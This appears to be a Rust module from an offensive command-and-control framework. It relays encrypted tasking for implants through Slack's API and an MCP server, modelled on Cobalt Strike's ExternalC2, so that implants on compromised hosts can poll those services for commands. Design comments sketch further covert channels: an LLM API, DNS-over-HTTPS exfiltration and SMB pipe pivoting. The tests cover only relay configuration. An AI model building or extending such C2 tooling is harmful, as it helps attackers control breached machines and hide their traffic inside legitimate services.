//! External-C2 relay — bridges the implant's `/extc2/*` endpoint to the real
//! third-party API using the `nyx-transport` crate's channel implementations.
//!
//! ## What this fixes
//!
//! Before this module existed, the server registered `/extc2/{slack,discord,
//! llm,mcp}` routes that all delegated to the plain `beacon` handler
//! (`crates/server/src/lib.rs`). That processed the inbound frame correctly
//! but **never relayed anything to the real third-party API** — the
//! `crates/transport/src/{slack_api,mcp,llm_api}.rs` implementations had
//! zero consumers, exactly as the `lib.rs` "pending integration" header
//! warned. The routes existed in name only.
//!
//! This module makes the server an actual external-C2 relay: after the beacon
//! handler produces the encrypted reply frame, the relay forwards a copy to
//! the configured third-party channel (Slack / MCP) via the transport crate.
//! A real Slack-beacon or MCP-beacon polling that channel then sees the task
//! data appear on the third-party side.
//!
//! ## Architecture (mirrors Cobalt Strike ExternalC2)
//!
//! ```text
//!   implant                team server                   third party
//!   -------                -----------                   -----------
//!   POST /extc2/slack  -->  beacon handler (decrypt,
//!                           queue results, seal reply)
//!                                |
//!                                +--> local HTTP reply --> implant (legacy path)
//!                                |
//!                                +--> relay_to_slack() --[SlackTransport]--> Slack channel
//!                                                                          ^
//!                                          [a real Slack-implant polls  ---+
//!                                           conversations.history here]
//! ```
//!
//! The relay is **fan-out + fire-and-forget**: it must not block or fail the
//! beacon reply. It runs in `tokio::task::spawn_blocking` because the transport
//! crate's channels are blocking (`ureq`).
//!
//! ## Configuration
//!
//! Each relay is opt-in via an environment variable:
//! - `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL` + `NYX_EXTC2_SLACK_HMAC_KEY` → enables Slack relay
//! - `NYX_EXTC2_MCP_URL` + `NYX_EXTC2_MCP_KEY` + `NYX_EXTC2_MCP_SESSION` → enables MCP relay
//!
//! The Slack HMAC key is **required and fail-closed**: enabling the Slack
//! relay without `NYX_EXTC2_SLACK_HMAC_KEY` (or with a malformed / all-zero
//! key) is a boot error. The relay must never run with a zero/guessable HMAC
//! key — that would let any third party forge relayed frames (CRITICAL-22).
//!
//! When unset, the relay is a no-op (the route still works as a plain beacon
//! endpoint, preserving the legacy behaviour for operators who haven't stood
//! up the third-party side yet).
//!
//! ## Transport stack
//!
//! One [`nyx_transport::TransportStack`] is built at boot by
//! [`ExtC2RelayConfig::from_env`] whenever any relay is enabled, and is shared
//! by both relay entry points. Transports are constructed exactly once (each
//! owns an HTTP agent and per-channel rate-limit/cooldown state that must
//! persist across calls) instead of being rebuilt per relay call.
//!
//! ## Why only Slack + MCP here
//!
//! The four external-C2 channels in `crates/transport/src/` are Slack, LLM,
//! MCP, and (via the transport crate's `MalleableTransport`) the HTTP profile
//! detail. This module wires the two highest-value, most-tested relays as a
//! proof-of-concept and leaves clear design notes for the remaining channels.
//! See the per-channel notes at the bottom of this file.

use std::sync::{Arc, Mutex};

// Pull the concrete channel impls + the stack so the boot-time transports can
// be pushed into the shared `TransportStack`.
use nyx_transport::mcp::McpTransport;
use nyx_transport::slack_api::SlackTransport;
use nyx_transport::TransportStack;

/// Decode a hex-encoded 32-byte HMAC key. Returns `Err` on any malformed
/// input — there is deliberately NO all-zero fallback: an all-zero key is
/// guessable and would let a third party forge relayed frames (CRITICAL-22),
/// so a missing/malformed/all-zero key must fail the relay closed at boot,
/// never degrade it silently.
fn decode_hmac_key(hex: &str) -> Result<[u8; 32], String> {
    let hex = hex.trim();
    if hex.len() != 64 || !hex.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(format!(
            "NYX_EXTC2_SLACK_HMAC_KEY must be exactly 64 hex characters (32 bytes), got {hex:?}"
        ));
    }
    let mut key = [0u8; 32];
    for (i, chunk) in hex.as_bytes().chunks(2).enumerate() {
        // Unreachable under the ascii-hexdigit guard above, but never panic.
        let text = std::str::from_utf8(chunk).map_err(|_| "non-UTF-8 in HMAC key".to_string())?;
        key[i] = u8::from_str_radix(text, 16).map_err(|_| "invalid hex digit".to_string())?;
    }
    if key == [0u8; 32] {
        return Err(
            "NYX_EXTC2_SLACK_HMAC_KEY decodes to an all-zero key, which provides no \
             frame-integrity protection — refusing to enable the relay"
                .to_string(),
        );
    }
    Ok(key)
}

/// Per-server relay configuration. Built once at boot from the environment;
/// stored in `AppState` and cloned cheaply (it's all `Arc`s and small strings).
///
/// Fields are `Option` because each channel is independently opt-in: an
/// operator running a Slack relay but not an MCP relay sets only the Slack
/// env vars. A `None` field means "relay disabled for this channel" and the
/// route handler skips the fan-out entirely.
#[derive(Clone, Default)]
pub struct ExtC2RelayConfig {
    /// Slack bot token (`xoxb-...`) + channel ID + HMAC key. `None` when the
    /// Slack relay is disabled.
    pub slack: Option<SlackRelay>,
    /// MCP server URL + bearer key + session ID. `None` when the MCP relay
    /// is disabled.
    pub mcp: Option<McpRelay>,
    /// The ONE shared transport stack, built at boot by
    /// [`ExtC2RelayConfig::from_env`] when any relay is enabled. Both relay
    /// entry points lock this and send — no per-call transport construction.
    /// `None` when no relay is enabled.
    pub stack: Option<Arc<Mutex<TransportStack>>>,
}

impl std::fmt::Debug for ExtC2RelayConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ExtC2RelayConfig")
            .field("slack", &self.slack.is_some())
            .field("mcp", &self.mcp.is_some())
            .field("stack", &self.stack.is_some())
            .finish()
    }
}

#[derive(Clone)]
pub struct SlackRelay {
    pub bot_token: Arc<str>,
    pub channel_id: Arc<str>,
    /// HMAC-SHA256 key for transport-layer frame integrity (CRITICAL-22 fix).
    /// Derived from NYX_EXTC2_SLACK_HMAC_KEY (hex-encoded 32 bytes) at boot.
    /// Both the team server and the Slack-polling implant must share this key
    /// so the implant can verify the tag on relayed frames.
    pub session_key: [u8; 32],
}

#[derive(Clone)]
pub struct McpRelay {
    pub server_url: Arc<str>,
    pub api_key: Arc<str>,
    pub session_id: Arc<str>,
}

impl ExtC2RelayConfig {
    /// Load relay configuration from the process environment. Absent vars =
    /// that channel's relay is disabled (returns `None` for it).
    ///
    /// This is the single source of truth for relay config — `main.rs` calls
    /// it once at boot and stores the result in `AppState`.
    ///
    /// Fail-closed: when the Slack relay is enabled (`NYX_EXTC2_SLACK_TOKEN`
    /// + `NYX_EXTC2_SLACK_CHANNEL` both set) but `NYX_EXTC2_SLACK_HMAC_KEY` is
    /// missing, malformed, or all-zero, this returns `Err` and the server
    /// refuses to boot — the relay must never run with a guessable HMAC key.
    ///
    /// When any relay is enabled, the ONE shared [`TransportStack`] is built
    /// here (channels pushed in priority order: Slack first, MCP as fallback)
    /// and stored in [`Self::stack`]; both relay entry points send through it.
    pub fn from_env() -> Result<Self, String> {
        let slack: Option<SlackRelay> = match (
            std::env::var("NYX_EXTC2_SLACK_TOKEN"),
            std::env::var("NYX_EXTC2_SLACK_CHANNEL"),
        ) {
            (Ok(token), Ok(channel)) if !token.is_empty() && !channel.is_empty() => {
                let hmac_hex = std::env::var("NYX_EXTC2_SLACK_HMAC_KEY").map_err(|_| {
                    "NYX_EXTC2_SLACK_HMAC_KEY is required when the Slack relay is enabled \
                     (NYX_EXTC2_SLACK_TOKEN and NYX_EXTC2_SLACK_CHANNEL are both set); \
                     refusing to start with a guessable HMAC key"
                        .to_string()
                })?;
                let session_key = decode_hmac_key(&hmac_hex)?;
                Some(SlackRelay {
                    bot_token: token.into(),
                    channel_id: channel.into(),
                    session_key,
                })
            }
            _ => None,
        };
        let mcp: Option<McpRelay> = match (
            std::env::var("NYX_EXTC2_MCP_URL"),
            std::env::var("NYX_EXTC2_MCP_KEY"),
            std::env::var("NYX_EXTC2_MCP_SESSION"),
        ) {
            (Ok(url), Ok(key), Ok(session))
                if !url.is_empty() && !key.is_empty() && !session.is_empty() =>
            {
                Some(McpRelay {
                    server_url: url.into(),
                    api_key: key.into(),
                    session_id: session.into(),
                })
            }
            _ => None,
        };

        // Build the ONE shared transport stack when any relay is enabled. The
        // transports are constructed here at boot, not per relay call: each
        // owns an HTTP agent and per-channel rate-limit/cooldown state that
        // must persist across calls (e.g. Slack's 1.2 s inter-message gap).
        let stack = if slack.is_some() || mcp.is_some() {
            let mut builder = TransportStack::builder();
            if let Some(s) = &slack {
                builder = builder.push(SlackTransport::new(
                    s.bot_token.to_string(),
                    s.channel_id.to_string(),
                    &s.session_key,
                ));
            }
            if let Some(m) = &mcp {
                builder = builder.push(McpTransport::new(
                    m.server_url.to_string(),
                    m.session_id.to_string(),
                    m.api_key.to_string(),
                ));
            }
            let stack = builder
                .build()
                .map_err(|e| format!("failed to build extc2 transport stack: {e}"))?;
            Some(Arc::new(Mutex::new(stack)))
        } else {
            None
        };

        Ok(ExtC2RelayConfig { slack, mcp, stack })
    }

    /// True iff at least one channel's relay is configured. When false the
    /// server doesn't need to spawn any background relay tasks at all.
    pub fn any_enabled(&self) -> bool {
        self.slack.is_some() || self.mcp.is_some()
    }
}

// ── Relay entry points ────────────────────────────────────────────────────

/// Send `reply_frame` through the shared boot-time [`TransportStack`].
/// Fire-and-forget: spawns a blocking task and returns immediately. A failure
/// to relay does NOT fail the beacon request — the local HTTP reply has
/// already been delivered to the implant, and a third-party outage shouldn't
/// take the beacon offline.
///
/// The mutex is held for the duration of the blocking `send` (ureq HTTP
/// call). This serialises concurrent relays, which the transports require
/// anyway: Slack enforces a 1.2 s inter-message cooldown that only works when
/// sends go through the same instance, and the stack's fallback state must
/// not be mutated concurrently.
fn relay_via_stack(channel: &'static str, stack: Arc<Mutex<TransportStack>>, reply_frame: Vec<u8>) {
    tokio::task::spawn_blocking(move || {
        let mut stack = match stack.lock() {
            Ok(g) => g,
            // Poisoning means another relay task panicked — not a security
            // state loss (the stack holds no secrets). Recover and continue.
            Err(poisoned) => poisoned.into_inner(),
        };
        match stack.send(&reply_frame) {
            Ok(()) => tracing::debug!(
                target: "nyx::extc2",
                channel,
                bytes = reply_frame.len(),
                "extc2 relay: reply posted"
            ),
            Err(e) => tracing::warn!(
                target: "nyx::extc2",
                channel,
                error = ?e,
                "extc2 relay: post failed (fire-and-forget; beacon reply unaffected)"
            ),
        }
    });
}

/// Relay `reply_frame` to the configured Slack channel via the shared
/// boot-time [`TransportStack`] (the frame is base64-encoded and posted to
/// `chat.postMessage` exactly as a Slack-beacon polling `conversations.history`
/// would expect to see it). When the stack's active channel is the MCP
/// transport (Slack demoted/burned), the frame is sent there instead — the
/// relay's job is to surface the encrypted reply frame on a third-party
/// channel the implant polls, so stack failover is desirable, not a bug.
///
/// No-op when no relay is configured (the route still works as a plain
/// beacon endpoint).
pub fn relay_reply_to_slack(cfg: &ExtC2RelayConfig, reply_frame: Vec<u8>) {
    if let Some(stack) = &cfg.stack {
        relay_via_stack("slack", Arc::clone(stack), reply_frame);
    }
}

/// Relay `reply_frame` to the configured MCP server via `tools/call`. Same
/// fire-and-forget semantics and shared-stack behaviour as
/// [`relay_reply_to_slack`].
pub fn relay_reply_to_mcp(cfg: &ExtC2RelayConfig, reply_frame: Vec<u8>) {
    if let Some(stack) = &cfg.stack {
        relay_via_stack("mcp", Arc::clone(stack), reply_frame);
    }
}

// ── Remaining-channel design notes ────────────────────────────────────────
//
// The other transport-crate channels are NOT wired here yet. Each is a
// straightforward extension of the pattern above once its env-var contract is
// decided:
//
// **LLM (Anthropic)** — `crates/transport/src/llm_api.rs::LlmApiTransport`.
//   Needs `NYX_EXTC2_LLM_KEY` + `NYX_EXTC2_LLM_MODEL` + a 32-byte session key
//   (XOR obfuscation layer). The session-key piece is the hold-up: it must be
//   agreed between server and the LLM-beacon out-of-band, and the current
//   transport takes a raw `[u8;32]`. Skipping until the key-exchange story is
//   settled (the protocol-layer ChaCha20-Poly1305 AEAD is the real crypto
//   anyway; the XOR is only cosmetic shaping).
//
// **DoH DNS** — `crates/transport/src/doh_dns.rs::DohDnsTransport`. This one
//   doesn't fit the relay model cleanly: a DoH-beacon exfils via DNS query
//   names and infils via TXT records, which means the server side is an
//   authoritative DNS server, not an HTTP relay. It belongs behind a dedicated
//   UDP/53 listener, not an axum route. Out of scope for this integration.
//
// **Malleable** — `crates/transport/src/malleable.rs::MalleableTransport`.
//   Already conceptually covered by the server's existing Malleable C2 profile
//   support (`nyx-profile`, served at profile-declared transaction URIs). The
//   transport crate's version is a standalone client useful for dev harnesses;
//   wiring it as a relay would duplicate the profile path. Skip.
//
// **SMB pipe** — `crates/transport/src/smb_pipe.rs::SmbPipeTransport`. This is
//   a peer-to-peer pivot transport (implant↔implant via named pipe), NOT a
//   server-side relay. The server has no business calling it; it's consumed
//   implant-side by the existing `implant-win/src/channels/smb.rs`. Skip.

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn from_env_returns_disabled_when_unset() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        let cfg = ExtC2RelayConfig::from_env().unwrap();
        assert!(cfg.slack.is_none());
        assert!(cfg.mcp.is_none());
        assert!(cfg.stack.is_none());
        assert!(!cfg.any_enabled());
    }

    #[test]
    fn from_env_enables_slack_when_all_three_vars_set() {
        // NOTE: env-var-mutating unit tests are not thread-safe with cargo's
        // default multi-threaded test runner. Run this body single-threaded by
        // wrapping in a mutex serialising all env-touching tests.
        let _g = ENV_LOCK.lock();
        // Clean slate: clear every relay var so leftover state from another test
        // (or the dev shell) can't flip the result.
        clear_all_env();
        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
        std::env::set_var("NYX_EXTC2_SLACK_CHANNEL", "C123");
        std::env::set_var("NYX_EXTC2_SLACK_HMAC_KEY", "ab".repeat(32));
        let cfg = ExtC2RelayConfig::from_env().unwrap();
        assert!(cfg.slack.is_some(), "slack should be enabled");
        assert_eq!(&*cfg.slack.as_ref().unwrap().bot_token, "xoxb-test");
        assert_eq!(&*cfg.slack.as_ref().unwrap().channel_id, "C123");
        // Enabling any relay builds the ONE shared stack at boot.
        assert!(cfg.stack.is_some(), "slack enabled ⇒ shared stack built");
        assert!(cfg.mcp.is_none());
        assert!(cfg.any_enabled());
        clear_all_env();
    }

    #[test]
    fn from_env_fails_closed_when_slack_enabled_without_hmac_key() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
        std::env::set_var("NYX_EXTC2_SLACK_CHANNEL", "C123");
        // NYX_EXTC2_SLACK_HMAC_KEY deliberately unset → boot must fail.
        let err = ExtC2RelayConfig::from_env().unwrap_err();
        assert!(
            err.contains("NYX_EXTC2_SLACK_HMAC_KEY"),
            "fail-closed error must name the missing key: {err}"
        );
        clear_all_env();
    }

    #[test]
    fn from_env_rejects_malformed_or_all_zero_hmac_key() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
        std::env::set_var("NYX_EXTC2_SLACK_CHANNEL", "C123");
        // Wrong length (63 hex chars) → Err.
        std::env::set_var("NYX_EXTC2_SLACK_HMAC_KEY", "ab".repeat(31) + "a");
        assert!(ExtC2RelayConfig::from_env().is_err());
        // Non-hex content → Err.
        std::env::set_var("NYX_EXTC2_SLACK_HMAC_KEY", "zz".repeat(32));
        assert!(ExtC2RelayConfig::from_env().is_err());
        // Explicitly all-zero key → Err (no all-zero fallback, even when the
        // operator set the variable on purpose).
        std::env::set_var("NYX_EXTC2_SLACK_HMAC_KEY", "00".repeat(32));
        let err = ExtC2RelayConfig::from_env().unwrap_err();
        assert!(err.contains("all-zero"), "all-zero key error: {err}");
        clear_all_env();
    }

    #[test]
    fn from_env_ignores_partial_slack_config() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
        // NYX_EXTC2_SLACK_CHANNEL deliberately unset.
        let cfg = ExtC2RelayConfig::from_env().unwrap();
        assert!(
            cfg.slack.is_none(),
            "a token without a channel ID must not enable the relay"
        );
        assert!(cfg.stack.is_none());
        clear_all_env();
    }

    #[test]
    fn from_env_enables_mcp_when_all_three_vars_set() {
        let _g = ENV_LOCK.lock();
        clear_all_env();
        std::env::set_var("NYX_EXTC2_MCP_URL", "https://mcp.example.com");
        std::env::set_var("NYX_EXTC2_MCP_KEY", "0123456789abcdef0123456789abcdef");
        std::env::set_var("NYX_EXTC2_MCP_SESSION", "sess-1");
        let cfg = ExtC2RelayConfig::from_env().unwrap();
        assert!(cfg.mcp.is_some(), "mcp should be enabled");
        assert_eq!(
            &*cfg.mcp.as_ref().unwrap().server_url,
            "https://mcp.example.com"
        );
        assert_eq!(&*cfg.mcp.as_ref().unwrap().session_id, "sess-1");
        assert!(cfg.stack.is_some(), "mcp enabled ⇒ shared stack built");
        assert!(cfg.slack.is_none());
        assert!(cfg.any_enabled());
        clear_all_env();
    }

    #[test]
    fn decode_hmac_key_roundtrip_and_errors() {
        // Exact 64-hex roundtrip.
        assert_eq!(decode_hmac_key(&"ab".repeat(32)), Ok([0xab; 32]));
        // All-zero keys are rejected at decode time (no all-zero fallback).
        let err = decode_hmac_key(&"00".repeat(32)).unwrap_err();
        assert!(err.contains("all-zero"), "all-zero key error: {err}");
        // Trims surrounding whitespace.
        assert_eq!(
            decode_hmac_key(&format!("  {}  ", "cd".repeat(32))),
            Ok([0xcd; 32])
        );
        // Malformed input → Err, never an all-zero fallback.
        assert!(decode_hmac_key("").is_err());
        assert!(decode_hmac_key("00").is_err()); // 1 byte ≠ 32
        assert!(decode_hmac_key(&"gg".repeat(32)).is_err());
    }

    /// Serialise every env-mutating test so they don't race on `set_var`/
    /// `remove_var` (which would be UB across threads). All tests above
    /// acquire this lock before touching the environment.
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    fn clear_all_env() {
        for k in [
            "NYX_EXTC2_SLACK_TOKEN",
            "NYX_EXTC2_SLACK_CHANNEL",
            "NYX_EXTC2_SLACK_HMAC_KEY",
            "NYX_EXTC2_MCP_URL",
            "NYX_EXTC2_MCP_KEY",
            "NYX_EXTC2_MCP_SESSION",
        ] {
            std::env::remove_var(k);
        }
    }

    #[test]
    fn debug_format_does_not_leak_credentials() {
        let cfg = ExtC2RelayConfig {
            slack: Some(SlackRelay {
                bot_token: "xoxb-SECRET".into(),
                channel_id: "C1".into(),
                session_key: [0u8; 32],
            }),
            mcp: None,
            stack: None,
        };
        let s = format!("{cfg:?}");
        // Debug must show only presence, never the token value.
        assert!(s.contains("slack: true"), "debug: {s}");
        assert!(!s.contains("SECRET"), "debug leaked credential: {s}");
    }
}
